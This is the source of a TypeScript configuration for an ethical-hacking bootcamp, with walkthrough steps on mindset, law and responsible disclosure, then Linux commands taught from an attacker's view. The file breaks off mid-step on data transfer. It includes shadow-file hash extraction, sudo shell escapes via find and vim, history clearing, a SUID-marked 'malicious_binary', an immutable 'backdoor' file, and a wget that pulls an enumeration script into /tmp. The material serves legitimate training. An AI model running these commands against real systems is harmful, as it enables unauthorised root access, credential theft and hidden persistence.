/**
 * HACKER PROTOCOL BOOTCAMP — STATIC CONFIG
 * =========================================
 * Single source of truth for the bootcamp walkthrough structure.
 * MUST mirror the backend bootcamp.config.js exactly.
 *
 * Instruction format supports:
 *   - Fenced code blocks:  ```bash\ncommand\n```
 *   - Inline code:         `command`
 *   - Plain prose
 */

export interface BootcampStep {
  title: string;
  instruction: string;
  /** Exact filename from the filesystem. null = no image yet → show placeholder. */
  image: string | null;
}

export interface BootcampRoom {
  id: string;       // e.g. "room1"
  title: string;    // MUST match backend room title exactly (case-insensitive)
  overview: string;
  estimatedMinutes: number; // Estimated time to complete this room
  steps: BootcampStep[];
}

export interface BootcampPhase {
  id: string;       // e.g. "phase1"
  title: string;    // MUST match backend module title exactly (case-insensitive)
  codename: string;
  color?: string;   // hex color for this phase
  rooms: BootcampRoom[];
}

export interface BootcampConfig {
  id: string;
  title: string;
  phases: BootcampPhase[];
}

// ── Phase Colors ──────────────────────────────────────────────────────────────
export const PHASE_COLORS: Record<string, string> = {
  phase1: '#3b82f6', // blue-500 (Mindset)
  phase2: '#10b981', // emerald-500 (Linux)
  phase3: '#f59e0b', // amber-500 (Networking)
  phase4: '#8b5cf6', // violet-500 (Web)
  phase5: '#ec4899', // pink-500 (Social)
};

// ── Image path builder ────────────────────────────────────────────────────────
export function buildStepImagePath(
  phaseId: string,
  roomId: string,
  filename: string
): string {
  // Full URLs (CDN images) or absolute paths are passed through unchanged
  if (
    filename.startsWith('http://') ||
    filename.startsWith('https://') ||
    filename.startsWith('/')
  ) {
    return filename;
  }

  const phaseMatch = phaseId.match(/\d+/);
  const roomMatch = roomId.match(/\d+/);
  const phaseNum = phaseMatch ? Number(phaseMatch[0]) : 0;
  const roomNum = roomMatch ? Number(roomMatch[0]) : 0;
  const phaseDir = `phase-${String(phaseNum).padStart(2, '0')}`;
  const roomDir = `room-${String(roomNum).padStart(2, '0')}`;

  const normalized = filename.trim().toLowerCase().replace(/_/g, '-');
  const withStepPrefix = normalized.startsWith('step-')
    ? normalized
    : normalized.replace(/^(\d+)/, (m) => `step-${m.padStart(2, '0')}`);

  const encoded = withStepPrefix
    .split('/')
    .map((part) => encodeURIComponent(part))
    .join('/');

  return `/assets/walkthrough/hpb/${phaseDir}/${roomDir}/${encoded}`;
}

// ── Config ────────────────────────────────────────────────────────────────────
export const BOOTCAMP_CONFIG: BootcampConfig = {
  id: 'hpb',
  title: 'Hacker Protocol Bootcamp',
  phases: [

    // ── PHASE 1: HACKER MINDSET (moduleId: 1, 4 rooms) ──────────────────────
    {
      id: 'phase1',
      title: 'Hacker Mindset',
      codename: 'PHASE 1',
      color: PHASE_COLORS.phase1,
      rooms: [
        {
          id: 'room1',
          title: 'Introduction to Offensive Security',
          overview:
            'Offensive security is the practice of thinking and acting like an attacker — with permission — to find weaknesses before real adversaries do. This room explains what the field is, why it exists, and how HSOCIETY fits into it.',
          estimatedMinutes: 20,
          steps: [
            {
              title: 'What Is Offensive Security?',
              instruction:
                `Offensive security (also called red teaming or ethical hacking) is the discipline of proactively attacking systems, networks, and applications to discover vulnerabilities before malicious actors do. The key word is **proactively** — you are not waiting for an attack to happen; you are simulating one under controlled conditions.

The field sits on the opposite side of defensive security (blue teaming), which focuses on detection, response, and hardening. Both sides need each other: defenders need to know what attackers do, and attackers need to understand what defenders look for.

**Core disciplines in offensive security:**
- **Penetration testing** — a scoped, time-boxed engagement to find and report vulnerabilities in a specific target
- **Red teaming** — a longer, more realistic simulation of a full adversary campaign, including social engineering and physical access
- **Bug bounty hunting** — independently finding vulnerabilities in public programmes and reporting them for a reward
- **Vulnerability research** — discovering new, previously unknown vulnerabilities in software or hardware

In your notes, write down the key difference between offensive and defensive security in your own words. Then write one sentence explaining why organisations pay people to attack their own systems.`,
              image: 'step-01.webp',
            },
            {
              title: 'The HSOCIETY Operating Model',
              instruction:
                `HSOCIETY is built on three pillars: **education**, **execution**, and **community**. Understanding this model tells you exactly what you are training for and how the programme is structured.

**Education** — You are here. The bootcamp gives you the technical foundation, the methodology, and the mindset. No prior experience is assumed. Everything is built from first principles.

**Execution** — After the bootcamp, you apply what you have learned in real engagements: CTF competitions, bug bounty programmes, and eventually client work. Execution is where theory becomes skill.

**Community** — Offensive security is a team sport. The HSOCIETY community is where you share findings, ask questions, collaborate on challenges, and build your reputation as an operator.

Write down what each pillar means to you personally. Be specific — not "I want to learn hacking" but "I want to be able to conduct a web application penetration test independently within six months."`,
              image: 'step-02.webp',
            },
            {
              title: 'Career Paths in Offensive Security',
              instruction:
                `The offensive security field has several distinct career paths. Knowing which one interests you helps you focus your learning.

**Penetration Tester** — Works for a consultancy or in-house security team. Conducts scoped assessments of networks, web applications, and infrastructure. Produces written reports with findings and remediation advice. This is the most common entry point.

**Red Team Operator** — Simulates advanced persistent threats (APTs). Works in longer engagements, often without the blue team knowing. Requires deep technical skill and creativity.

**Bug Bounty Hunter** — Works independently, finding vulnerabilities in public programmes run by companies like Google, Microsoft, and HackerOne. Income is variable but uncapped.

**Security Researcher** — Discovers new vulnerability classes, writes exploits, and publishes research. Often works at security firms, universities, or independently.

**CTF Player** — Competes in Capture The Flag competitions. A great way to build skills and reputation. Many professionals started here.

In your notes, rank these paths from most to least interesting to you and explain why. This is not a permanent decision — it is a starting point for your learning focus.`,
              image: 'step-03.webp',
            },
          ],
        },
        {
          id: 'room2',
          title: 'The Hacker Mindset',
          overview:
            'The most important tool you will ever develop is not a piece of software — it is how you think. This room breaks down the cognitive traits that separate effective operators from people who just run tools.',
          estimatedMinutes: 18,
          steps: [
            {
              title: 'The Three Core Traits',
              instruction:
                `Every effective operator shares three cognitive traits. These are not personality types you are born with — they are habits you develop through deliberate practice.

**1. Curiosity** — The drive to understand how things work, not just that they work. When you see a login form, a curious operator asks: what happens if I send an unexpected character? What database is behind this? What framework is the application built on? Curiosity is what makes you look one layer deeper than everyone else.

**2. Persistence** — Most attacks fail on the first attempt. Effective operators iterate. They try a different payload, a different port, a different approach. The difference between finding a vulnerability and missing it is often just one more attempt.

**3. Lateral thinking** — The ability to approach a problem from an unexpected angle. Security controls are designed to stop expected attacks. Lateral thinking is how you find the path the defender did not anticipate.

For each trait, write a concrete example of how it would apply in a real engagement. Do not use generic examples — think of a specific scenario.`,
              image: 'step-01.webp',
            },
            {
              title: 'Applying the Mindset',
              instruction:
                `The hacker mindset is not something you switch on during an engagement — it is a way of observing the world. You can practise it right now, without any tools.

Pick any object near you — a door lock, a coffee machine, a website you use daily. Apply the following questions:

1. **How was this built?** What assumptions did the designer make about how it would be used?
2. **What is the intended use?** What is the system designed to do?
3. **What is the unintended use?** What can it do that the designer did not intend?
4. **What does it trust?** What inputs does it accept without verification?
5. **What happens at the boundary?** What happens when you give it input that is too long, too short, unexpected, or malformed?

This exercise is not trivial. The ability to ask these questions about any system — a web application, a network protocol, a physical lock — is the foundation of every vulnerability discovery.

Write your answers for the object you chose. Be specific and detailed.`,
              image: 'step-02.webp',
            },
            {
              title: 'Tools vs. Understanding',
              instruction:
                `There is a critical distinction between someone who runs tools and someone who understands what those tools do. This distinction determines your ceiling as an operator.

A tool runner opens Metasploit, selects an exploit, and runs it. If it works, they report it. If it does not, they move on. They cannot adapt when the tool fails, cannot explain the vulnerability to a client, and cannot find vulnerabilities that no tool covers.

An operator understands the underlying vulnerability — the memory corruption, the logic flaw, the misconfiguration. They can replicate the attack manually, adapt it to a different context, and explain it clearly in a report.

**The goal of this bootcamp is to make you an operator, not a tool runner.**

Every tool you use in this programme, you will understand from first principles before you use it. You will know what it does, why it works, and how to replicate its core function manually.

In your notes, answer this question honestly: right now, are you closer to a tool runner or an operator? What specific knowledge gaps would you need to close to move further toward operator?`,
              image: 'step-03.webp',
            },
          ],
        },
        {
          id: 'room3',
          title: 'Ethics & Legal Boundaries',
          overview:
            'Operating without authorisation is a criminal offence in every jurisdiction. This room covers the legal framework, the concept of scope, and responsible disclosure — the non-negotiable foundations of professional offensive security.',
          estimatedMinutes: 22,
          steps: [
            {
              title: 'The Legal Framework',
              instruction:
                `Offensive security without written authorisation is illegal. This is not a grey area. The following laws apply depending on your jurisdiction:

**United Kingdom** — The Computer Misuse Act 1990 (CMA) makes it a criminal offence to access a computer system without authorisation (Section 1), to access with intent to commit further offences (Section 2), and to impair the operation of a computer (Section 3). Penalties range from fines to 10 years imprisonment.

**United States** — The Computer Fraud and Abuse Act (CFAA) prohibits unauthorised access to protected computers. Penalties can reach 20 years imprisonment for serious offences.

**European Union** — Directive 2013/40/EU on attacks against information systems criminalises unauthorised access across all member states.

**The key principle in every jurisdiction:** authorisation is the line between legal security testing and criminal hacking. The technical actions are identical — only the authorisation differs.

In your notes, research the specific law that applies in your country. Write down the key offences and their maximum penalties. You are responsible for knowing this.`,
              image: '/assets/bootcamp/rooms/ethics-legal-framework.webp',
            },
            {
              title: 'Scope and Authorisation',
              instruction:
                `In a professional engagement, **scope** defines exactly what you are and are not permitted to test. It is documented in a written agreement before any testing begins.

A typical scope document includes:
- **In-scope targets** — specific IP ranges, domains, or applications you are permitted to test
- **Out-of-scope targets** — systems you must not touch, even if you discover them during testing
- **Permitted techniques** — what attack types are allowed (e.g. no denial of service, no physical access)
- **Testing window** — the dates and times during which testing is permitted
- **Emergency contacts** — who to call if you accidentally cause an outage or find a critical vulnerability

**Why this matters:** If you test a system that is out of scope — even accidentally — you may have committed a criminal offence. The authorisation document is your legal protection. Without it, you have none.

Write down in your notes: what would you do if, during a penetration test, you discovered a critical vulnerability in a system that was out of scope? There is a correct answer — research it.`,
              image: '/assets/bootcamp/rooms/ethics-scope-authorization.webp',
            },
            {
              title: 'Responsible Disclosure',
              instruction:
                `Responsible disclosure (also called coordinated disclosure) is the process of reporting a vulnerability to the affected organisation before making it public, giving them time to fix it.

**The standard disclosure process:**

1. **Discover** the vulnerability and document it thoroughly — what it is, how to reproduce it, and what the impact is
2. **Identify** the correct contact — most organisations have a security@[domain] address or a published security policy
3. **Report** the vulnerability privately, including all technical details and a proof of concept
4. **Agree on a timeline** — the industry standard is 90 days for the organisation to release a fix before you publish
5. **Follow up** if there is no response within a reasonable time (typically 7-14 days)
6. **Publish** your findings after the fix is released, or after the agreed deadline passes

**Why this matters:** Publishing a vulnerability before a fix is available puts every user of that software at risk. Responsible disclosure balances the public's right to know with the need to protect users.

**Bug bounty programmes** formalise this process — companies publish the rules, the scope, and the rewards. Always read the programme rules before testing.

Document the full responsible disclosure process in your notes. Include what you would do if the organisation ignored your report after 90 days.`,
              image: '/assets/bootcamp/rooms/ethics-responsible-disclosure.webp',
            },
          ],
        },
      ],
    },

    // ── PHASE 2: LINUX FOUNDATIONS (moduleId: 2, 5 rooms) ───────────────────
    {
      id: 'phase2',
      title: 'Linux Foundations',
      codename: 'PHASE 2',
      color: PHASE_COLORS.phase2,
      rooms: [
        {
          id: 'room1',
          title: 'Linux Basics & Navigation',
          overview:
            "To become an HSociety Hacker, you must first master the environment where we live: the Linux terminal. This isn't just about typing commands; it's about learning the language of the machine. In this room, you will transition from a curious observer to a skilled operator, building the 'muscle memory' required for high-stakes engagements.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'The HSociety Command Center',
              instruction:
                `The terminal is your cockpit. Every HSociety Hacker starts here, learning to interact with the system without the crutches of a GUI. As you train like a hacker, you'll realize that the terminal provides a level of precision and speed that point-and-click interfaces can never match.

**1. Environmental Awareness:**
Before doing anything, you need to know what kind of environment you've just landed in.
\`\`\`bash
# Identify the OS and Kernel version (Essential for finding exploits)
uname -a

# Check the system hostname
hostname

# See who else is currently logged in
users
\`\`\`

**2. History and Efficiency:**
A professional operator never types the same long command twice. Use these to move faster.
\`\`\`bash
# Search your command history (Use Ctrl+R for a live search!)
history | tail -n 20

# Create an 'alias' to save time on common HSociety tasks
alias ll='ls -lah --color=auto'

# Clear your tracks (visually) when the screen gets messy
clear
\`\`\`

**3. The Global Directory Structure:**
Linux is organized like a giant tree. As an HSociety Hacker, you should know exactly where the 'prizes' are hidden.
- \`/root\` — The ultimate goal. The home of the system administrator.
- \`/home\` — Where the users live. A goldmine for personal files and SSH keys.
- \`/var/log\` — The 'Black Box.' This records everything that happens. A smart hacker knows how to read these — and how to stay out of them.
- \`/proc\` — A virtual filesystem that shows every running process as a folder.

**4. Navigating the Root:**
\`\`\`bash
# See the root of the entire system
ls -F /

# Check your current path (Where am I in the target environment?)
pwd

# List files with human-readable sizes (K, M, G)
ls -lh
\`\`\`

**5. Shell Identity & Variables:**
Your shell has its own settings and variables that define how it behaves.
\`\`\`bash
# See your current 'Path' (Where Linux looks for programs)
echo $PATH

# See which shell you are currently using
echo $SHELL

# Set a temporary variable for your current target
export TARGET="<target_ip>"
echo "Current Target: $TARGET"
\`\`\`

**6. Mastering the Manual:**
Never guess. The answers are usually built into the system.
\`\`\`bash
# Read the manual for the 'find' command
man find

# Get a one-line description of what a command does
whatis grep

# Search the manuals for a keyword like "network"
apropos network
\`\`\`

*Training Task:* Use \`export\` to set a variable named \`CODENAME\` to your hacker handle. Then use \`echo\` to print it. Congratulations, you've just taken your first step in the HSociety training program.`,
              image: 'step-01.webp',
            },
            {
              title: 'Navigation & Advanced File Searching',
              instruction:
                `In a real-world engagement, you won't always have a map. You need to be able to jump between directories and locate sensitive data in seconds. To train like a hacker is to be fast and invisible.

**1. Teleportation Shortcuts:**
Move across the HSociety environment without breaking your flow.
\`\`\`bash
# Jump to the previous directory you were in
cd -

# Go 'Up' two levels at once
cd ../..

# Return to your home base immediately
cd ~
\`\`\`

**2. Using the Directory Stack:**
Intermediate hackers use the 'stack' to remember where they were.
\`\`\`bash
# 'Push' a directory onto the stack (Move there and remember where you were)
pushd /var/log

# 'Pop' back to your original location
popd
\`\`\`

**3. The Power of 'Find':**
Finding a specific file in a sea of data is a core HSociety skill.
\`\`\`bash
# Find files modified in the last 10 minutes (Spot active logs!)
find /var/log -mmin -10 2>/dev/null

# Find files larger than 100MB (Look for database backups)
find / -size +100M -type f 2>/dev/null

# Find files owned by a specific user
find /home -user "hacker_trainee" 2>/dev/null
\`\`\`

**4. Locating Assets Instantly:**
While \`find\` searches the disk, \`locate\` searches a pre-built database. It's much faster but needs to be updated.
\`\`\`bash
# Update the locate database (Requires sudo)
sudo updatedb

# Search for any file with 'secret' in the name
locate secret.txt
\`\`\`

**5. Creating Your Own Workspace:**
\`\`\`bash
# Create a nested directory structure for your engagement
mkdir -p ./hsociety/recon/targets

# Create a symlink (a shortcut) to a deep directory
ln -s /var/www/html/uploads/images ./my_shortcut
\`\`\`

**6. Safe File Deletion:**
As an HSociety Hacker, you leave no trace.
\`\`\`bash
# Delete a file permanently
rm target_evidence.log

# Delete an entire folder and its contents recursively
rm -rf ./tmp_recon_data
\`\`\`

*Hacker Challenge:* Navigate to \`/tmp\`, create a folder named \`hs_workspace\`, jump inside, and then use \`cd -\` to return to your previous location. How many commands did it take?`,
              image: 'step-02.webp',
            },
            {
              title: 'Permissions & Privilege Context',
              instruction:
                `To become a hacker, you must understand the walls that try to keep you out. In Linux, permissions are the difference between being a guest and being the owner.

**1. The Permission String Decoded:**
When you run \`ls -l\`, you see something like \`-rwxr-xr-x\`.
- **r (4)**: Read access.
- **w (2)**: Write/Modify access.
- **x (1)**: Execute (run) access.

**2. Checking for Weak Points:**
HSociety Hackers look for "World Writable" files — these are misconfigurations that allow anyone to change sensitive data.
\`\`\`bash
# Find files that EVERYONE can write to (A huge security hole!)
find / -perm -o+w -type f 2>/dev/null

# Find directories that are world-writable (Perfect for hiding your tools)
find / -perm -o+w -type d 2>/dev/null
\`\`\`

**3. SUID & SGID: The Holy Grail:**
These special permissions allow a file to run with the privileges of the OWNER (usually root), regardless of who starts it.
\`\`\`bash
# Find SUID binaries (The primary path to becoming root)
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries (Run with group privileges)
find / -perm -2000 -type f 2>/dev/null
\`\`\`

**4. Advanced Ownership Checks:**
Sometimes a group has more power than the individual user.
\`\`\`bash
# See which groups have access to a specific sensitive file
ls -l /etc/shadow

# See all files owned by the 'shadow' group
find / -group shadow 2>/dev/null
\`\`\`

**5. Access Control Lists (ACLs):**
Modern Linux uses ACLs for even more specific permissions.
\`\`\`bash
# See detailed permissions for a file (including hidden ACLs)
getfacl secret_plan.txt

# Check the 'default' permissions for new files you create
umask
\`\`\`

**6. Identity Manipulation (The basics of moving laterally):**
\`\`\`bash
# Switch to another user's identity (if you have their password)
su - trainee_02

# Run a single command as another user
su trainee_02 -c "ls /home/trainee_02"
\`\`\`

*Pro Tip:* If you find an SUID file owned by root, check it against **GTFOBins**. If it's on the list, you are seconds away from full system control.`,
              image: 'step-03.webp',
            },
            {
              title: 'Reading, Filtering & Data Extraction',
              instruction:
                `The true skill of an HSociety Hacker is finding the 'signal' in the 'noise.' Servers generate millions of lines of logs; your job is to extract the few lines that contain passwords, usernames, or vulnerabilities.

**1. The Basic Readers:**
\`\`\`bash
# View the start of a file (check for headers)
head -n 20 /var/log/auth.log

# Monitor a log file in real-time (Watch users log in!)
tail -f /var/log/auth.log

# View a file with line numbers (Essential for reporting)
cat -n target_config.php
\`\`\`

**2. Intermediate Grep Techniques:**
\`\`\`bash
# Search for 'password' but ignore the case (find PASSWORD, Password, etc.)
grep -i "password" /etc/ 2>/dev/null

# Show 3 lines of 'Context' before and after a match
grep -C 3 "error" /var/log/syslog

# Count how many times a word appears
grep -c "failed" /var/log/auth.log
\`\`\`

**3. Using 'Cut' and 'Sort' to Clean Data:**
Clean data is easier to analyze. Use these to format your recon.
\`\`\`bash
# Extract just the usernames from /etc/passwd (the first field)
cut -d ":" -f 1 /etc/passwd

# Sort a list and remove duplicates (Great for building unique user lists)
cat discovered_emails.txt | sort -u > unique_emails.txt
\`\`\`

**4. Awk: The Secret Weapon:**
Awk is a mini-language for processing columns of data.
\`\`\`bash
# Print the 1st and 3rd columns of a file
ls -l | awk '{print $1, $9}'

# Find processes running as root using awk
ps aux | awk '$1 == "root" {print $11}'
\`\`\`

**5. Sed: The Stream Editor:**
Use Sed to modify text on the fly without opening an editor.
\`\`\`bash
# Replace 'vulnerable' with 'SECURED' in the output (Don't worry, it doesn't change the file)
cat report.txt | sed 's/vulnerable/SECURED/g'

# Delete the first line of a file in the output
cat data.csv | sed '1d'
\`\`\`

**6. Combining Everything (The Pipeline):**
This is where you become a true HSociety Hacker.
\`\`\`bash
# Find the top 5 most common IP addresses in your logs
cat /var/log/access.log | cut -d " " -f 1 | sort | uniq -c | sort -nr | head -n 5
\`\`\`

*Experiment:* Try running \`history | awk '{print $2}' | sort | uniq -c | sort -nr | head -n 5\`. This will show you your top 5 most used commands. What does it reveal about your training habits?`,
              image: 'step-04.webp',
            },
          ],
        },
        {
          id: 'room2',
          title: 'Users, Groups & Permissions',
          overview:
            "Identity is the cornerstone of security. In this room, you'll learn how Linux identifies who is a friend and who is a potential intruder. By mastering user accounts, shadow files, and privilege escalation pathways, you will learn to navigate the HSociety network like a ghost in the machine.",
          estimatedMinutes: 30,
          steps: [
            {
              title: 'Hacker Identity & Footprint',
              instruction:
                `Every action you take leaves a footprint. To become a hacker, you must understand exactly how the system sees you. Your UID, GID, and group memberships are your 'DNA' in the Linux world.

**1. Verifying Your Credentials:**
\`\`\`bash
# See your detailed identity (UID, GID, Groups)
id

# Just your username (Who am I right now?)
whoami

# See all groups available on the system
cat /etc/group | cut -d ":" -f 1
\`\`\`

**2. Tracking System Usage:**
Professional operators monitor who else is on the system to avoid detection.
\`\`\`bash
# Who is logged in and what are they doing?
w

# See the last 10 login events (Check for unusual activity)
last -n 10

# See when the last person logged in to each account
lastlog | grep -v "Never logged in"
\`\`\`

**3. Environment Variables (The Hidden Profile):**
Your identity isn't just a name; it's a set of variables that follow you.
\`\`\`bash
# See all your current environment variables
env

# See where your bash history is being saved (and how many lines)
echo $HISTFILE
echo $HISTSIZE

# Clear your current session history so it isn't saved on exit
history -c
\`\`\`

**4. Advanced User Enumeration:**
\`\`\`bash
# List all users with a UID of 0 (Root or root-equivalent accounts)
awk -F: '$3 == 0 {print $1}' /etc/passwd

# Find all users who have an interactive shell (Potential targets)
grep -E "sh$|bash$" /etc/passwd
\`\`\`

**5. System Uptime & Load:**
Knowing how long a system has been up can tell you if it's been recently patched.
\`\`\`bash
# Check how long the HSociety target has been running
uptime

# See the system's 'ID' in the kernel's eyes
cat /proc/version
\`\`\`

**6. User Defaults & Creation (Intermediate):**
\`\`\`bash
# See the default settings for new users (Important for post-exploitation)
useradd -D

# Check when a user's password was last changed
sudo chage -l $(whoami)
\`\`\`

*Identity Check:* Run \`id\`. If you see \`uid=0\`, you have achieved total control. If not, your HSociety training continues. How many groups are you currently a member of?`,
              image: 'step-01.webp',
            },
            {
              title: 'The Vault: Passwd & Shadow Files',
              instruction:
                `The authentication system of Linux is built on two primary files. To train like a hacker is to understand how to read these files and extract the cryptographic hashes that protect the system's keys.

**1. The Public Directory (/etc/passwd):**
This file is readable by everyone. It's a map of every account on the target.
\`\`\`bash
# Count how many accounts exist on this target
wc -l /etc/passwd

# Find accounts that don't have a password set (Very rare but high value)
awk -F: '($2 == "") {print $1}' /etc/passwd
\`\`\`

**2. The Cryptographic Vault (/etc/shadow):**
This file is restricted to root. It contains the salted hashes of every user's password.
\`\`\`bash
# View the hash for your current user (Requires sudo)
sudo grep $(whoami) /etc/shadow

# Identify the hashing algorithm used ($6$ = SHA-512)
sudo head -n 1 /etc/shadow | cut -d "$" -f 2
\`\`\`

**3. Database Interrogation (getent):**
Instead of just reading files, use \`getent\` to query the system's databases.
\`\`\`bash
# Get the passwd entry for the 'root' user
getent passwd root

# Get all members of the 'sudo' group
getent group sudo
\`\`\`

**4. Sudoers Configuration:**
The \`/etc/sudoers\` file defines who can become root. It's the most sensitive file on the system.
\`\`\`bash
# Check the syntax of the sudoers file without opening it
sudo visudo -c

# See which users have been explicitly granted sudo rights
sudo grep -v "#" /etc/sudoers | grep "ALL"
\`\`\`

**5. Shell Access Controls:**
\`\`\`bash
# See which shells are 'legal' on this system
cat /etc/shells

# Change your own default shell (Use with caution!)
chsh -s /bin/zsh
\`\`\`

**6. Automated Account Auditing:**
\`\`\`bash
# Find all accounts with 'nologin' (Service accounts)
grep "nologin" /etc/passwd | cut -d ":" -f 1

# List accounts that HAVE a home directory but NO shell
awk -F: '$6 ~ /\\/home/ && $7 ~ /nologin/ {print $1}' /etc/passwd
\`\`\`

*HSociety Insight:* In the \`shadow\` file, the string between the first and second \`$\` is the salt. A hacker uses this salt along with the hash to perform 'Brute Force' or 'Dictionary' attacks offline.`,
              image: 'step-02.webp',
            },
            {
              title: 'Advanced Permissions Manipulation',
              instruction:
                `To become an HSociety Hacker, you must learn to manipulate the environment to suit your needs. Whether it's locking down your tools or creating a back-door, \`chmod\` and \`chown\` are your primary instruments.

**1. The Octal vs Symbolic Mastery:**
\`\`\`bash
# Octal: Set Read/Write/Execute for owner, nothing for others
chmod 700 secret_script.sh

# Symbolic: Remove 'Write' and 'Execute' from 'Group' and 'Others'
chmod go-wx public_file.txt
\`\`\`

**2. Recursive Ownership Changes:**
\`\`\`bash
# Change the owner of an entire folder and everything inside it
sudo chown -R $(whoami):$(whoami) ./hsociety_tools

# Use a 'Reference' file to set permissions (Match the target's look!)
chmod --reference=/etc/passwd my_fake_passwd
\`\`\`

**3. Special Bit Manipulation:**
Beyond R, W, and X, there are special bits that HSociety Hackers look for.
\`\`\`bash
# Set the SUID bit (File runs as the owner)
chmod u+s malicious_binary

# Set the 'Sticky Bit' on a folder (Only owners can delete their files)
chmod +t /tmp/my_shared_folder
\`\`\`

**4. Immutable Files (The ultimate defense):**
Some files can be made 'immutable,' meaning even root cannot delete them without removing the attribute first.
\`\`\`bash
# See special attributes on a file
lsattr sensitive_config.php

# Make a file immutable (Requires root)
sudo chattr +i important_backdoor.php
\`\`\`

**5. Advanced Umask and Defaults:**
\`\`\`bash
# See your current umask in symbolic form
umask -S

# Set umask so new files are only readable by you
umask 077
\`\`\`

**6. Group Management (Moving Laterally):**
\`\`\`bash
# Create a new group for your HSociety team
sudo groupadd hs_redteam

# Add a user to a group without removing them from others
sudo usermod -aG sudo trainee_01
\`\`\`

*Challenge:* Create a file, set its permissions to \`000\`, and then try to delete it as a normal user. Does Linux let you delete a file you can't even read?`,
              image: 'step-03.webp',
            },
            {
              title: 'Sudo: The Path to Absolute Control',
              instruction:
                `The final step in mastering identity is the \`sudo\` command. It is the bridge between a mere trainee and a full-fledged HSociety Hacker. Understanding how to audit and abuse sudo configurations is the key to system-wide dominance.

**1. Auditing Your Privileges:**
\`\`\`bash
# The most important command for privilege escalation
sudo -l

# Check if your current sudo token is still active (no password required)
sudo -v
\`\`\`

**2. Running as Other Users:**
Sudo isn't just for root. Use it to move 'laterally' into service accounts.
\`\`\`bash
# Run a command as the 'www-data' user
sudo -u www-data whoami

# Open a shell as a specific user
sudo -u postgres /bin/bash
\`\`\`

**3. SudoEdit: The Safer (and Abusable) Way:**
\`\`\`bash
# Use sudoedit to modify a file without running the editor as root
sudoedit /etc/hosts

# Check which editor sudo is using
echo $EDITOR
\`\`\`

**4. Escaping Restricted Shells:**
Many binaries allowed in sudo can be "tricked" into giving you a shell.
\`\`\`bash
# If 'find' is allowed in sudo, use it to spawn a root shell
sudo find . -exec /bin/sh -p \\; -quit

# If 'vim' is allowed, escape to a shell from inside
sudo vim -c ':!/bin/sh'
\`\`\`

**5. Sudo Environment Preservation:**
\`\`\`bash
# Run a command as root but keep your current environment variables
sudo -E ./my_custom_tool.sh
\`\`\`

**6. Logging & Monitoring Sudo:**
\`\`\`bash
# See the last 50 sudo attempts in the system logs
sudo tail -n 50 /var/log/auth.log | grep sudo
\`\`\`

*Training Insight:* If you see \`(ALL) NOPASSWD: ALL\` in your \`sudo -l\` output, you have already won. You can run any command as root without a password. Train like a hacker, think like an owner.`,
              image: 'step-04.webp',
            },
          ],
        },
        {
          id: 'room3',
          title: 'Processes & Networking',
          overview:
            "A system is a living organism, constantly exchanging data and running background tasks. To train like a hacker is to understand the heartbeat of the machine. In this room, you will learn to monitor every process and every open door in the target environment, identifying targets and evading detection.",
          estimatedMinutes: 35,
          steps: [
            {
              title: 'Monitoring the Heartbeat (Processes)',
              instruction:
                `Every program on Linux is a process. As an HSociety Hacker, you must know how to spot unusual activity, identify service accounts, and even manipulate running programs to your advantage.

**1. Deep Process Inspection:**
\`\`\`bash
# List all processes with full command lines (Spot hidden flags!)
ps auxww

# Show only processes owned by 'root'
ps -u root

# Show the process hierarchy (Find the 'parent' of a suspicious task)
ps -ef --forest
\`\`\`

**2. Real-Time System Surveillance:**
\`\`\`bash
# Interactive monitor (Sort by Memory: press 'M', CPU: press 'P')
top -b -n 1 | head -n 20

# Check for 'Zombie' processes (Programs that failed to die)
ps aux | awk '$8=="Z"'
\`\`\`

**3. Investigating Process Files:**
Linux treats everything as a file. You can look directly at a process's memory and settings in \`/proc\`.
\`\`\`bash
# See the exact command that started process 1234
cat /proc/1234/cmdline | tr '\0' ' '

# See the environment variables of a running process
sudo cat /proc/1234/environ | tr '\0' '\n'

# List all files currently opened by a process (Requires root)
sudo lsof -p 1234
\`\`\`

**4. Performance & Resource Auditing:**
\`\`\`bash
# See how much memory is free on the target system
free -ht

# Check disk usage (Find where the large logs are hidden)
df -h
\`\`\`

**5. Intermediate Process Control:**
\`\`\`bash
# Change the priority of a running process (Make your tool run faster!)
sudo renice -n -10 -p 1234

# Trace the system calls of a process (See what it's REALLY doing)
sudo strace -p 1234 2>&1 | head -n 20
\`\`\`

**6. Finding Processes by Name or Port:**
\`\`\`bash
# Find the PID of the web server
pgrep -a apache

# Find which process is using port 80
sudo lsof -i :80
\`\`\`

*Hacker's Insight:* If you see a process running as root from the \`/tmp\` or \`/dev/shm\` directory, it's a major red flag. HSociety Hackers use these directories to hide their temporary tools.`,
              image: 'step-01.webp',
            },
            {
              title: 'Mapping the Exposure (Network Ports)',
              instruction:
                `Every open port is a potential entry point into the HSociety network. Before you can become a hacker, you must learn to map these 'doors' and understand which services are listening for a connection.

**1. Auditing Listening Services:**
\`\`\`bash
# List all listening TCP and UDP ports with process names
sudo ss -tulnp

# Show established connections (Who is talking to this machine right now?)
ss -atn
\`\`\`

**2. Interface & IP Configuration:**
\`\`\`bash
# Show all network interfaces and their IP addresses
ip addr show

# See the system's routing table (Where does the data go?)
ip route show
\`\`\`

**3. Advanced Socket Filtering:**
Intermediate operators use filters to find exactly what they need.
\`\`\`bash
# Show only established HTTPS connections
ss -o state established '( dport = :443 or sport = :443 )'

# Count how many connections are in each state (LISTEN, ESTAB, etc.)
ss -ant | awk '{print $1}' | sort | uniq -c
\`\`\`

**4. Investigating Network Logs:**
\`\`\`bash
# See recent network-related events in the kernel log
dmesg | grep -i "network" | tail -n 20

# Check the ARP cache (See which other machines are on the local network)
ip neighbor show
\`\`\`

**5. DNS Configuration & Resolution:**
\`\`\`bash
# See which DNS servers this target is using
cat /etc/resolv.conf

# Check the local 'Hosts' file for internal HSociety mappings
cat /etc/hosts
\`\`\`

**6. Legacy Network Tools (Still essential):**
\`\`\`bash
# The classic way to see interface stats
ifconfig -a

# See which ports are open using the older netstat command
netstat -pant
\`\`\`

*Training Task:* Run \`ss -tulnp\`. Can you find any service listening on \`0.0.0.0\`? That means it's open to the entire network. If it's on \`127.0.0.1\`, it's only open to people already on the machine.`,
              image: 'step-02.webp',
            },
            {
              title: 'Remote Interaction & Data Transfer',
              instruction:
                `To train like a hacker, you must master the art of moving data between systems. Whether it's exfiltrating a database or uploading your custom HSociety toolkit, these commands are your lifeline.

**1. The Web-Based Extractors:**
\`\`\`bash
# Download a tool from a remote server
wget http://<remote_server_ip>/tools/linpeas.sh -O /tmp/linpeas.sh

# Fetch the headers of a target site to identify the server
curl -I http://<target_ip>

